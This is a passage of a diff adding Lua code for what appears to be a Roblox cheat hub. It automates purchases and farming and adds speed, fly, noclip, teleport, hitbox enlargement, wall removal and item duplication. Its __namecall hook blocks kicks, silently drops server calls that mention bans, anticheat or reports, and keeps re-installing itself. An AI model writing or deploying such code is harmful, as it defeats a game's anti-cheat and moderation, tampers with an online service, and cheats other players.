+        end
+    end
+
+    if data.serverKeyVariants then
+        for _, variant in ipairs(data.serverKeyVariants) do
+            local normV = _normaliseKey(variant)
+            for k, v in pairs(_resolvedKeys) do
+                if _normaliseKey(k) == normV then return v end
+            end
+        end
+    end
+    return data.serverKey
+end
+local function _isInStock(data)
+    local normDN = _normaliseKey(data.displayName)
+    local normSK = _normaliseKey(data.serverKey)
+    if next(_stockData) == nil then return true end
+    local anyFound   = false
+    local anyInStock = false
+    for k, v in pairs(_stockData) do
+        local normK = _normaliseKey(k)
+        if normK == normDN or normK == normSK
+        or normK:find(normSK, 1, true) or normSK:find(normK, 1, true) then
+            anyFound = true
+            if v.inStock then anyInStock = true end
+        end
+    end
+    if anyFound then return anyInStock end
+    return true
+end
+local function getGearsInShop()
+    local result = {}
+    for k, v in pairs(_stockData) do
+        result[k] = v.inStock
+    end
+    local ga = _getGearsAccess()
+    if ga then
+        for _, child in pairs(ga:GetChildren()) do
+            local cn = child.Name:lower()
+            if result[cn] == nil then result[cn] = true end
+        end
+    end
+    return result
+end
+local function buyGear(gearKey)
+    local data = GEAR_REGISTRY[gearKey]
+    if not data then return BUY_RESULT.NOT_IN_SHOP end
+    local remote = _VP_REMOTE
+    if not remote then return BUY_RESULT.NOT_IN_SHOP end
+    do
+        local normDN = _normaliseKey(data.displayName)
+        local normSK = _normaliseKey(data.serverKey)
+        for k, v in pairs(_stockData) do
+            if v.manual and not v.inStock then
+                if (tick() - (v.t or 0)) > 90 then
+                    _stockData[k] = nil
+                else
+                    local normK = _normaliseKey(k)
+                    if normK == normDN or normK == normSK
+                    or normK:find(normSK,1,true) or normSK:find(normK,1,true) then
+                        return BUY_RESULT.OUT_OF_STOCK
+                    end
+                end
+            end
+        end
+    end
+    if data.coinPrice > 0 and getCoins() < data.coinPrice then
+        return BUY_RESULT.NO_COINS
+    end
+    local serverKey  = _resolveServerKey(data)
+    local coinBefore = getCoins()
+    local existingTools = {}
+    local function snapshotTools(container)
+        if not container then return end
+        for _, v in pairs(container:GetChildren()) do
+            if v:IsA("Tool") then existingTools[v] = true end
+        end
+    end
+    local backpack = player:FindFirstChild("Backpack")
+    local char     = player.Character
+    snapshotTools(backpack)
+    snapshotTools(char)
+    local received  = false
+    local resultMsg = ""
+    local conns     = {}
+    local function onToolAdded(v)
+        if not v:IsA("Tool") then return end
+        if existingTools[v] then return end
+        received = true
+    end
+    if backpack then table.insert(conns, backpack.ChildAdded:Connect(onToolAdded)) end
+    if char     then table.insert(conns, char.ChildAdded:Connect(onToolAdded)) end
+    local notifRE = ReplicatedStorage:FindFirstChild("Events")
+        and ReplicatedStorage.Events:FindFirstChild("Notification")
+    if notifRE then
+        table.insert(conns, notifRE.OnClientEvent:Connect(function(msg)
+            if type(msg) == "string" and msg ~= "" and resultMsg == "" then
+                resultMsg = msg
+            end
+        end))
+    end
+    if gearKey:sub(1, 3) == "LB_" then
+        local rarityName = data.displayName:match("^(.+) Lucky Block$") or ""
+        local variants = {
+            rarityName .. " Lucky Block (World)",
+            rarityName .. " Lucky Block",
+            rarityName .. " LuckyBlock",
+            rarityName .. "LuckyBlock",
+            rarityName .. " Lucky Block World",
+            (rarityName .. " Lucky Block (World)"):lower(),
+            (rarityName .. " Lucky Block"):lower(),
+            (rarityName .. " LuckyBlock"):lower(),
+            rarityName:lower() .. "_lucky_block",
+            rarityName:lower() .. "luckyblock",
+            "Purchase " .. rarityName .. " Lucky Block",
+            "Buy " .. rarityName .. " Lucky Block",
+            "Lucky Block " .. rarityName,
+            ("Lucky Block " .. rarityName):lower(),
+            data.serverKey,
+            data.serverKey:lower(),
+        }
+        local fired = {}
+        for _, v in ipairs(variants) do
+            if v ~= "" and not fired[v] then
+                fired[v] = true
+                pcall(function() remote:FireServer(v) end)
+                task.wait(0.05)
+            end
+        end
+    else
+        pcall(function() remote:FireServer(serverKey) end)
+    end
+    local waited = 0
+    while waited < 5 and not received and resultMsg == "" do
+        task.wait(0.2)
+        waited = waited + 0.2
+        local function scanNew(container)
+            if not container then return end
+            for _, v in pairs(container:GetChildren()) do
+                if v:IsA("Tool") and not existingTools[v] then
+                    received = true
+                end
+            end
+        end
+        scanNew(backpack)
+        scanNew(char)
+    end
+    for _, c in pairs(conns) do pcall(function() c:Disconnect() end) end
+    if received then
+        _resolvedKeys[data.displayName:lower()] = serverKey
+        Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName, Duration = 3, Image = 4483362458 })
+        return BUY_RESULT.SUCCESS
+    end
+    if data.coinPrice > 0 and getCoins() < coinBefore then
+        _resolvedKeys[data.displayName:lower()] = serverKey
+        Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName, Duration = 3, Image = 4483362458 })
+        return BUY_RESULT.SUCCESS
+    end
+    local m = resultMsg:lower()
+    if m:find("out of stock") or m:find("sold out") or (m:find("out") and m:find("stock")) then
+        _writeStock(data.displayName, false, 0, true)
+        _writeStock(data.serverKey,   false, 0, true)
+        return BUY_RESULT.OUT_OF_STOCK
+    elseif m:find("not enough") or m:find("afford") or (m:find("coin") and not m:find("stock")) then
+        return BUY_RESULT.NO_COINS
+    elseif m:find("success") or m:find("purchas") or m:find("bought") then
+        _resolvedKeys[data.displayName:lower()] = serverKey
+        Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName, Duration = 3, Image = 4483362458 })
+        return BUY_RESULT.SUCCESS
+    end
+    if data.coinPrice == 0 and resultMsg == "" and gearKey:sub(1,3) ~= "LB_" then
+        _resolvedKeys[data.displayName:lower()] = serverKey
+        Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName, Duration = 3, Image = 4483362458 })
+        return BUY_RESULT.SUCCESS
+    end
+    return BUY_RESULT.NOT_IN_SHOP
+end
+local function applyJumpFix(hum)
+    if not hum then return end
+    local function enforce()
+        if hum.Health <= 0 then return end
+        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+        if not S.jumpEnabled and hum.JumpPower <= 0 then
+            hum.JumpPower = 50
+        end
+    end
+    enforce()
+    hum:GetPropertyChangedSignal("JumpPower"):Connect(enforce)
+end
+player.CharacterAdded:Connect(function(char)
+    character = char
+    humanoid  = char:WaitForChild("Humanoid")
+    rootPart  = char:WaitForChild("HumanoidRootPart")
+    S.grabLock          = false
+    S.grabLockTime      = 0
+    _cache.GF         = nil
+    _cache.Brainrots  = nil
+    _cache.Plots      = nil
+    _cachedSubmitPart = nil
+    pcall(function() getgenv().OxyoExecQueued = false end)
+    task.wait(0.5)
+    if humanoid then
+        applyJumpFix(humanoid)
+        if S.speedEnabled then humanoid.WalkSpeed = S.currentSpeed end
+        if S.jumpEnabled  then humanoid.JumpPower  = S.currentJumpPower end
+    end
+    if S.flyEnabled then task.wait(0.3) startFlySystem() end
+    if S.noclipEnabled then
+        for _, part in pairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then part.CanCollide = false end
+        end
+    end
+    if S.lavaRemoved then
+        S.lavaRemoved = false
+        task.wait(0.5)
+        hideLava()
+    elseif isAnyHopActive() then
+        task.wait(0.5)
+        hideLava()
+    end
+    if getgenv().OxyoVolcanoAutoSubmitOnArrival then
+        getgenv().OxyoVolcanoAutoSubmitOnArrival = false
+        task.delay(3, function()
+            pcall(function()
+                if Rayfield then
+                    Rayfield:Notify({
+                        Title   = "🌋 Auto Submit",
+                        Content = "Arrived! Activating Auto Volcano Submit...",
+                        Duration = 3,
+                        Image   = 4483362458,
+                    })
+                end
+                S.volcanoEnabled = true
+                local flag = Rayfield and Rayfield.Flags and Rayfield.Flags["AutoVolcano"]
+                if flag then flag:Set(true) end
+            end)
+        end)
+    end
+    if S.collectorRunning and S.selectedRarities and #S.selectedRarities > 0 then
+        task.wait(1)
+        if S.collectorRunning then
+            stopFarmLoop()
+            task.wait(0.2)
+            startFarm(S.selectedRarities)
+        end
+    end
+    if S.autoNameEnabled and S.farmByNameFilter ~= "" then
+        task.wait(1)
+        if S.autoNameEnabled then
+            if S.autoNameThread then pcall(task.cancel, S.autoNameThread) S.autoNameThread = nil end
+            S.autoNameThread = task.spawn(function()
+                while S.autoNameEnabled do
+                    if S.grabLock then task.wait(0.2) continue end
+                    local snapshot = monitorData.brainrots
+                    local collected = false
+                    for _, entry in ipairs(snapshot) do
+                        if not S.autoNameEnabled then break end
+                        if S.grabLock then break end
+                        if entry.obj and entry.obj.Parent and passesByNameFilter(entry.obj) then
+                            collected = true
+                            local e = entry
+                            pcall(function() collectOne(e.rarity, e.obj) end)
+                            task.wait(0.5)
+                            break
+                        end
+                    end
+                    if not collected then task.wait(1) end
+                end
+            end)
+        end
+    end
+    initTraitHook()
+end)
+pcall(function()
+    if humanoid then applyJumpFix(humanoid) end
+end)
+UserInputService.JumpRequest:Connect(function()
+    pcall(function()
+        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if not hum or hum.Health <= 0 then return end
+        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+        if S.infinityJumpEnabled then
+            hum:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end)
+end)
+startMonitor()
+initTraitHook()
+local _errorCount = 0
+local _errorLog   = {}
+task.spawn(function()
+    task.wait(45)
+    while true do
+        task.wait(45)
+        pcall(function()
+            if not monitorData.isRunning then
+                monitorData.isRunning = false
+                startMonitor()
+            end
+            if S.collectorRunning and not S.collectorThread then
+                if S.selectedRarities and #S.selectedRarities > 0 then
+                    startFarm(S.selectedRarities)
+                end
+            end
+            if S.autoCoinEnabled and not coinCollectThread and not coinEventActive then
+                startCoinTracker()
+            end
+            if _aquaRunning and not _aquaThread then
+                pcall(_startAquaLoop)
+            end
+        end)
+    end
+end)
+task.spawn(function()
+    while true do
+        task.wait(600)
+        pcall(function()
+            _eventWatcherSent = {}
+            _webhookSeenBrainrots = {}
+            _cache.GF       = nil
+            _cache.Brainrots = nil
+            _cache.Plots    = nil
+            _cachedSubmitPart = nil
+        end)
+    end
+end)
+if _hasAdvancedAPI then
+    task.defer(function()
+        pcall(function()
+            local mt = getrawmetatable(game)
+            local oldNC = rawget(mt, "__namecall")
+            if not oldNC then return end
+            setreadonly(mt, false)
+            local _BAN_KEYS = {
+                "kick","ban","anticheat","cheat","exploit","hack",
+                "flag","suspend","report","detect","punish","terminate",
+                "sanction","infraction","violation","blacklist","teleportkick",
+                "forcedisconnect","forcekick","remotekick",
+            }
+            mt.__namecall = newcclosure(function(self, ...)
+                local isCaller = typeof(checkcaller) == "function" and checkcaller()
+                if isCaller then return oldNC(self, ...) end
+                local ok, method = pcall(getnamecallmethod)
+                if not ok then return oldNC(self, ...) end
+                if method == "Kick" then return end
+                if method == "FireServer" or method == "InvokeServer" then
+                    local args = {...}
+                    local s1 = typeof(args[1]) == "string" and args[1]:lower() or ""
+                    local s2 = typeof(args[2]) == "string" and args[2]:lower() or ""
+                    for _, kw in ipairs(_BAN_KEYS) do
+                        if s1:find(kw, 1, true) or s2:find(kw, 1, true) then return end
+                    end
+                end
+                if method == "FireClient" or method == "FireAllClients" then
+                    return
+                end
+                return oldNC(self, ...)
+            end)
+            setreadonly(mt, true)
+            task.spawn(function()
+                while true do
+                    task.wait(math.random(45, 75))
+                    pcall(function()
+                        local mt2 = getrawmetatable(game)
+                        if not mt2 then return end
+                        local cur = rawget(mt2, "__namecall")
+                        if cur ~= mt.__namecall then
+                            setreadonly(mt2, false)
+                            mt2.__namecall = mt.__namecall
+                            setreadonly(mt2, true)
+                        end
+                    end)
+                end
+            end)
+        end)
+    end)
+end
+do
+    local _lastActivity = tick()
+    if getgenv().OxyoAutoSafe == nil then
+        getgenv().OxyoAutoSafe = true
+    end
+    local function _doAntiAfk()
+        if not getgenv().OxyoAutoSafe then return end
+        pcall(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end)
+        pcall(function()
+            local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
+            if pg then
+                game:GetService("GuiService").SelectedObject = nil
+            end
+        end)
+        _lastActivity = tick()
+    end
+    Players.LocalPlayer.Idled:Connect(function()
+        _doAntiAfk()
+    end)
+    task.spawn(function()
+        while true do
+            local hopActive = getgenv().OxyoAutoHopCoin
+                or getgenv().OxyoAutoHopGodly
+                or getgenv().OxyoAutoHopCel
+                or getgenv().OxyoAutoHopFrag
+            local interval = hopActive and 20 or 55
+            task.wait(interval)
+            if tick() - _lastActivity >= interval then
+                _doAntiAfk()
+            end
+        end
+    end)
+    task.spawn(function()
+        while true do
+            task.wait(90)
+            if getgenv().OxyoAutoSafe then
+                pcall(function()
+                    game:GetService("GuiService").SelectedObject = nil
+                end)
+            end
+        end
+    end)
+end
+task.spawn(function()
+    while true do
+        task.wait(5)
+        if S.grabLock and (tick() - S.grabLockTime) > 8 then
+            S.grabLock     = false
+            S.grabLockTime = 0
+        end
+        if S.collectorRunning and not S.collectorThread then
+            if S.selectedRarities and #S.selectedRarities > 0 then
+                startFarm(S.selectedRarities)
+            end
+        end
+        if S.autoNameEnabled and not S.autoNameThread and S.farmByNameFilter ~= "" then
+            S.autoNameThread = task.spawn(function()
+                while S.autoNameEnabled do
+                    if S.grabLock then task.wait(0.2) continue end
+                    local snapshot = monitorData.brainrots
+                    local collected = false
+                    for _, entry in ipairs(snapshot) do
+                        if not S.autoNameEnabled then break end
+                        if S.grabLock then break end
+                        if entry.obj and entry.obj.Parent and passesByNameFilter(entry.obj) then
+                            collected = true
+                            local e = entry
+                            pcall(function() collectOne(e.rarity, e.obj) end)
+                            task.wait(0.5)
+                            break
+                        end
+                    end
+                    if not collected then task.wait(1) end
+                end
+            end)
+        end
+        if S.volcanoEnabled and not S.volcanoThread then
+            Rayfield:Notify({ Title = "🌋 Volcano", Content = "Watchdog: restarting...", Duration = 3, Image = 4483362458 })
+            S.volcanoThread = task.spawn(function()
+                while S.volcanoEnabled do
+                    local reqName, reqMut = getRequiredVolcanoBrainrot()
+                    if not reqName then task.wait(3) continue end
+                    local obj = findVolcanoTarget(reqName, reqMut)
+                    if not obj then task.wait(3) continue end
+                    pcall(grabBrainrot, obj)
+                    task.wait(0.4)
+                    pcall(submitToVolcano)
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+end)
+do
+    local _noclipParts = {}
+    local _noclipChar  = nil
+    task.spawn(function()
+        while true do
+            if not S.noclipEnabled then task.wait(1) continue end
+            task.wait(0.5)
+            local curChar = player.Character
+            if not curChar then continue end
+            if curChar ~= _noclipChar then
+                _noclipChar  = curChar
+                _noclipParts = {}
+                for _, part in pairs(curChar:GetDescendants()) do
+                    if part:IsA("BasePart") then table.insert(_noclipParts, part) end
+                end
+            end
+            for _, part in ipairs(_noclipParts) do
+                if part and part.Parent then part.CanCollide = false end
+            end
+        end
+    end)
+end
+task.spawn(function()
+    while true do
+        if not S.speedEnabled and not S.jumpEnabled then
+            task.wait(1)
+            continue
+        end
+        task.wait(0.5)
+        pcall(function()
+            local hum = character and character:FindFirstChild("Humanoid")
+            if not hum then return end
+            if S.speedEnabled then hum.WalkSpeed = S.currentSpeed end
+            if S.jumpEnabled  then hum.JumpPower  = S.currentJumpPower end
+        end)
+    end
+end)
+task.spawn(function()
+    while true do
+        if not S.hitboxEnabled then task.wait(2) continue end
+        task.wait(0.5)
+        for _, v in next, Players:GetPlayers() do
+            if v ~= player then
+                pcall(function()
+                    local root = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        root.Size         = Vector3.new(S.hitboxSize, S.hitboxSize, S.hitboxSize)
+                        root.Transparency = S.hitboxTransp
+                        root.BrickColor   = S.hitboxColor
+                        root.Material     = Enum.Material.Neon
+                        root.CanCollide   = false
+                    end
+                end)
+            end
+        end
+    end
+end)
+MainTab:CreateSection("Remove Objects")
+local _removeLavaConn = nil
+MainTab:CreateToggle({
+    Name         = "🌋 Remove Lava",
+    CurrentValue = false,
+    Flag         = "RemoveLava",
+    Callback     = function(v)
+        if v then
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                if obj.Name == "Lavas" or obj.Name == "Lava" then
+                    pcall(function() obj:Destroy() end)
+                end
+            end
+            S.lavaRemoved = true
+            if _removeLavaConn then _removeLavaConn:Disconnect() end
+            _removeLavaConn = workspace.DescendantAdded:Connect(function(obj)
+                if obj.Name == "Lavas" or obj.Name == "Lava" then
+                    task.defer(function() pcall(function() obj:Destroy() end) end)
+                end
+            end)
+            Rayfield:Notify({ Title = "🌋 Remove Lava", Content = "ON — lava removed.", Duration = 3, Image = 4483362458 })
+        else
+            if _removeLavaConn then _removeLavaConn:Disconnect() _removeLavaConn = nil end
+            S.lavaRemoved = false
+            Rayfield:Notify({ Title = "🌋 Remove Lava", Content = "OFF — lava returns next round.", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+MainTab:CreateToggle({
+    Name         = "🔒 Lock Lava (prevent auto-enable)",
+    CurrentValue = false,
+    Flag         = "LockAutoLava",
+    Callback     = function(v)
+        S.preventAutoLava = v
+    end,
+})
+MainTab:CreateButton({
+    Name     = "Remove VIP Walls",
+    Callback = function()
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v.Name == "VIPDoors" or v.Name == "VIPDoor" or v.Name == "VIPWall" then
+                pcall(function() v:Destroy() end)
+            end
+        end
+    end,
+})
+MainTab:CreateButton({
+    Name     = "Remove Killbricks",
+    Callback = function()
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local name = v.Name:lower()
+                if name:find("kill") or name:find("damage") or name:find("death") or
+                   name:find("void") or name:find("lava") or
+                   v.BrickColor == BrickColor.new("Really red") then
+                    pcall(function() v:Destroy() end)
+                end
+            end
+        end
+    end,
+})
+MainTab:CreateSection("My Plot")
+MainTab:CreateButton({
+    Name     = "Teleport to My Plot",
+    Callback = function()
+        local ok = teleportToMyPlot()
+        if not ok then
+            Rayfield:Notify({ Title = "Plot", Content = "Could not find your plot.", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+MainTab:CreateSection("Utilities")
+MainTab:CreateButton({
+    Name     = "Reset Config",
+    Callback = function()
+        local togglesOff = {
+            "InstantGrab","NoClip","SpeedEnabled","JumpEnabled","InfinityJump",
+            "AutoMeteor","AutoLuckyBlock","AutoSpinWheel","AutoFarmToggle",
+            "AutoFarmNameToggle","AutoMoney","AutoCoin","AutoHopCoin",
+            "AutoUpgrade","AutoSell","MutationAlert","AutoBuyGear","AutoBuyLB",
+            "HitboxToggle","FullBright",
+            "InfiniteZoom","PlayerESP","CelestialESP",
+        }
+        local slidersDefault = {
+            SpeedSlider = 16, JumpSlider = 50, FlySpeed = 1,
+            MaxCarrySlider = 1, SellThreshold = 50, SellTimerInterval = 0,
+            HitboxSize = 50, HitboxTransp = 7, FragUpgradeSecs = 50,
+        }
+        local dropdownsDefault = {
+            RarityDropdown = {}, MutationDropdown = {}, TraitDropdown = {},
+            LuckyBlockType = {"All"}, LuckyTraitDropdown = {}, HitboxColor = {"Really blue"},
+            GearDropdown = {}, GearMultiDropdown = {}, MutationAlertDropdown = {},
+        }
+        pcall(function()
+            if writefile then writefile("OxyoHub/oxyoHub_v6.json", "{}") end
+        end)
+        for _, flag in ipairs(togglesOff) do
+            pcall(function()
+                if Rayfield.Flags[flag] then
+                    Rayfield.Flags[flag]:Set(false)
+                end
+            end)
+        end
+        for flag, val in pairs(slidersDefault) do
+            pcall(function()
+                if Rayfield.Flags[flag] then
+                    Rayfield.Flags[flag]:Set(val)
+                end
+            end)
+        end
+        for flag, val in pairs(dropdownsDefault) do
+            pcall(function()
+                if Rayfield.Flags[flag] then
+                    Rayfield.Flags[flag]:Set(val)
+                end
+            end)
+        end
+        pcall(function() Rayfield:ResetConfiguration() end)
+        task.wait(0.3)
+        pcall(function() Rayfield:SaveConfiguration() end)
+        Rayfield:Notify({ Title = "Config Reset", Content = "All settings reset to default.", Duration = 3, Image = 4483362458 })
+    end,
+})
+MainTab:CreateButton({
+    Name     = "Rejoin Server",
+    Callback = function()
+        task.wait(1)
+        doTeleport(game.JobId)
+    end,
+})
+MainTab:CreateButton({
+    Name     = "Server Hop",
+    Callback = function()
+        nuclearStop()
+        getgenv().OxyoHopStopped = false
+        getgenv().OxyoAutoHopCoin = false
+        getgenv().OxyoAutoHopGodly = false
+        getgenv().OxyoAutoHopCel = false
+        getgenv().OxyoAutoHopFrag = false
+        getgenv().OxyoManualHop = true
+        task.wait(0.5)
+        local servers = {}
+        local ok, result = pcall(function() return game:HttpGet("https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100") end)
+        if ok and result then
+            pcall(function()
+                local data = game:GetService("HttpService"):JSONDecode(result)
+                if data and data.data then
+                    for _, sv in pairs(data.data) do
+                        if sv.id ~= game.JobId and sv.playing < sv.maxPlayers then
+                            table.insert(servers, sv.id)
+                        end
+                    end
+                end
+            end)
+        end
+        if #servers > 0 then
+            local picked = servers[math.random(1, #servers)]
+            local ok = pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, picked, Players.LocalPlayer) end)
+            if not ok then
+                task.wait(2)
+                pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1], Players.LocalPlayer) end)
+            end
+        else
+            Rayfield:Notify({ Title = "Server Hop", Content = "No servers found, retrying...", Duration = 3, Image = 4483362458 })
+            task.wait(3)
+            pcall(function() TeleportService:Teleport(game.PlaceId, Players.LocalPlayer) end)
+        end
+        task.delay(5, function() getgenv().OxyoManualHop = false end)
+    end,
+})
+MainTab:CreateSection("Click Teleport")
+do
+    local _clickTpEnabled = false
+    local _clickTpConn = nil
+    MainTab:CreateToggle({
+        Name         = "Click Teleport",
+        CurrentValue = false,
+        Flag         = "ClickTeleport",
+        Callback     = function(val)
+            _clickTpEnabled = val
+            if val then
+                _clickTpConn = UserInputService.InputBegan:Connect(function(input, gpe)
+                    if gpe then return end
+                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                        local char = Players.LocalPlayer.Character
+                        local root = char and char:FindFirstChild("HumanoidRootPart")
+                        if not root then return end
+                        local cam = workspace.CurrentCamera
+                        local ray
+                        if input.UserInputType == Enum.UserInputType.Touch then
+                            local pos = input.Position
+                            ray = cam:ScreenPointToRay(pos.X, pos.Y)
+                        else
+                            local mpos = UserInputService:GetMouseLocation()
+                            ray = cam:ScreenPointToRay(mpos.X, mpos.Y)
+                        end
+                        local result = workspace:Raycast(ray.Origin, ray.Direction * 1000, RaycastParams.new())
+                        if result then
+                            hideLava()
+                            root.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0))
+                        end
+                    end
+                end)
+                Rayfield:Notify({ Title = "Click Teleport", Content = "ON — tap/click to teleport!", Duration = 2, Image = 4483362458 })
+            else
+                if _clickTpConn then _clickTpConn:Disconnect() _clickTpConn = nil end
+                Rayfield:Notify({ Title = "Click Teleport", Content = "OFF", Duration = 2, Image = 4483362458 })
+            end
+        end,
+    })
+end
+
+MainTab:CreateSection("Instant Grab")
+MainTab:CreateToggle({
+    Name         = "Instant Grab",
+    CurrentValue = false,
+    Flag         = "InstantGrab",
+    Callback     = function(Value)
+        S.instantGrabEnabled = Value
+        if Value then
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("ProximityPrompt") then
+                    if not S.OriginalHoldTimes[v] then S.OriginalHoldTimes[v] = v.HoldDuration end
+                    v.HoldDuration = 0
+                end
+            end
+            S.instantGrabConnection = workspace.DescendantAdded:Connect(function(v)
+                if v:IsA("ProximityPrompt") then
+                    if not S.OriginalHoldTimes[v] then S.OriginalHoldTimes[v] = v.HoldDuration end
+                    v.HoldDuration = 0
+                end
+            end)
+        else
+            if S.instantGrabConnection then
+                S.instantGrabConnection:Disconnect()
+                S.instantGrabConnection = nil
+            end
+            for prompt, originalTime in pairs(S.OriginalHoldTimes) do
+                if prompt and prompt.Parent then prompt.HoldDuration = originalTime end
+            end
+            S.OriginalHoldTimes = {}
+        end
+    end,
+})
+MainTab:CreateSection("Movement")
+MainTab:CreateToggle({
+    Name         = "NoClip",
+    CurrentValue = false,
+    Flag         = "NoClip",
+    Callback     = function(Value) S.noclipEnabled = Value end,
+})
+MainTab:CreateSection("Player")
+MainTab:CreateToggle({
+    Name         = "Speed On/Off",
+    CurrentValue = false,
+    Flag         = "SpeedEnabled",
+    Callback     = function(Value)
+        S.speedEnabled = Value
+        pcall(function()
+            if character and character:FindFirstChild("Humanoid") then
+                if S.speedEnabled then
+                    S.originalSpeed = character.Humanoid.WalkSpeed
+                    character.Humanoid.WalkSpeed = S.currentSpeed
+                else
+                    character.Humanoid.WalkSpeed = S.originalSpeed or getGameSpeed()
+                    S.originalSpeed = nil
+                end
+            end
+        end)
+    end,
+})
+MainTab:CreateSlider({
+    Name         = "Walk Speed",
+    Range        = {16, 200},
+    Increment    = 1,
+    Suffix       = "Speed",
+    CurrentValue = 16,
+    Flag         = "SpeedSlider",
+    Callback     = function(Value)
+        S.currentSpeed = Value
+        if S.speedEnabled then
+            pcall(function()
+                if character and character:FindFirstChild("Humanoid") then
+                    character.Humanoid.WalkSpeed = S.currentSpeed
+                end
+            end)
+        end
+    end,
+})
+MainTab:CreateToggle({
+    Name         = "Jump Power On/Off",
+    CurrentValue = false,
+    Flag         = "JumpEnabled",
+    Callback     = function(Value)
+        S.jumpEnabled = Value
+        pcall(function()
+            if character and character:FindFirstChild("Humanoid") then
+                if S.jumpEnabled then
+                    S.originalJump = character.Humanoid.JumpPower
+                    character.Humanoid.JumpPower = S.currentJumpPower
+                else
+                    character.Humanoid.JumpPower = S.originalJump or getGameJump()
+                    S.originalJump = nil
+                end
+            end
+        end)
+    end,
+})
+MainTab:CreateSlider({
+    Name         = "Jump Power",
+    Range        = {50, 300},
+    Increment    = 1,
+    Suffix       = "Power",
+    CurrentValue = 50,
+    Flag         = "JumpSlider",
+    Callback     = function(Value)
+        S.currentJumpPower = Value
+        if S.jumpEnabled then
+            pcall(function()
+                if character and character:FindFirstChild("Humanoid") then
+                    character.Humanoid.JumpPower = S.currentJumpPower
+                end
+            end)
+        end
+    end,
+})
+MainTab:CreateToggle({
+    Name         = "Infinity Jump",
+    CurrentValue = false,
+    Flag         = "InfinityJump",
+    Callback     = function(Value) S.infinityJumpEnabled = Value end,
+})
+MainTab:CreateSection("Fly")
+MainTab:CreateToggle({
+    Name         = "Enable Fly  (Q = Up | E = Down)",
+    CurrentValue = false,
+    Callback     = function(Value)
+        S.flyEnabled = Value
+        if Value then startFlySystem() else stopFlySystem() end
+    end,
+})
+MainTab:CreateSlider({
+    Name         = "Fly Speed",
+    Range        = {1, 10},
+    Increment    = 1,
+    Suffix       = "x",
+    CurrentValue = 1,
+    Flag         = "FlySpeed",
+    Callback     = function(Value)
+        S.speeds = Value
+    end,
+})
+MainTab:CreateSection("Duplicate Brainrot")
+MainTab:CreateButton({
+    Name     = "Duplicate Equipped Brainrot",
+    Callback = function()
+        local success, msg = duplicateEquipped()
+        Rayfield:Notify({ Title = "Duplicate", Content = msg, Duration = 3, Image = 4483362458 })
+    end,
+})
+CollectorTab:CreateSection("Auto Meteor")
+local showStopHopGui
+local nuclearStop
+;(function()
+CollectorTab:CreateToggle({
+    Name         = "Auto Teleport to Meteor",
+    CurrentValue = false,
+    Flag         = "AutoMeteor",
+    Callback     = function(Value)
+        auto.meteorEnabled = Value
+        if Value then
+            hideLava()
+            auto.meteorThread = task.spawn(function()
+                while auto.meteorEnabled do
+                    pcall(function()
+                        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                        if not root then return end
+                        local bestMeteor, bestDist = nil, math.huge
+                        for _, obj in ipairs(workspace:GetChildren()) do
+                            if obj.Name == "Meteor" then
+                                local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+                                if part then
+                                    local dist = (part.Position - root.Position).Magnitude
+                                    if dist < bestDist then
+                                        bestMeteor = part
+                                        bestDist   = dist
+                                    end
+                                end
+                            end
+                        end
+                        if bestMeteor then
+                            local vel = bestMeteor.AssemblyLinearVelocity
+                            local pos = bestMeteor.Position
+                            local landPos
+                            if vel and vel.Y < -1 then
+                                local t = math.max(0, (pos.Y - 5) / (-vel.Y))
+                                landPos = Vector3.new(pos.X + vel.X * t, 5, pos.Z + vel.Z * t)
+                            else
+                                landPos = Vector3.new(pos.X, pos.Y + 3, pos.Z)
+                            end
+                            root.CFrame = CFrame.new(landPos)
+                        end
+                    end)
+                    task.wait(0.35)
+                end
+            end)
+        else
+            if auto.meteorThread then pcall(task.cancel, auto.meteorThread) auto.meteorThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Auto Lucky Block")
+local _luckyOpts = { "All" }
+for _, t in ipairs(LUCKY_TYPES) do
+    if t ~= "LuckyBlock" then table.insert(_luckyOpts, t) end
+end
+CollectorTab:CreateDropdown({
+    Name          = "Block Type",
+    Options       = _luckyOpts,
+    CurrentOption = { "All" },
+    Flag          = "LuckyBlockType",
+    Callback      = function(opt)
+        auto.luckyType = type(opt) == "table" and opt[1] or opt
+    end,
+})
+CollectorTab:CreateDropdown({
+    Name            = "Trait Filter  (empty = all)",
+    Options         = ALL_TRAITS,
+    CurrentOption   = {},
+    MultipleOptions = true,
+    Flag            = "LuckyTraitDropdown",
+    Callback        = function(Options) auto.luckyTraits = Options end,
+})
+CollectorTab:CreateToggle({
+    Name         = "Auto Lucky Block",
+    CurrentValue = false,
+    Flag         = "AutoLuckyBlock",
+    Callback     = function(Value)
+        auto.luckyEnabled = Value
+        if Value then
+            hideLava()
+            local gf = workspace:FindFirstChild("GameFolder")
+            local lb = gf and gf:FindFirstChild("LuckyBlocks")
+            if not lb then
+                Rayfield:Notify({ Title = "Auto Lucky Block", Content = "LuckyBlocks folder not found!", Duration = 4, Image = 4483362458 })
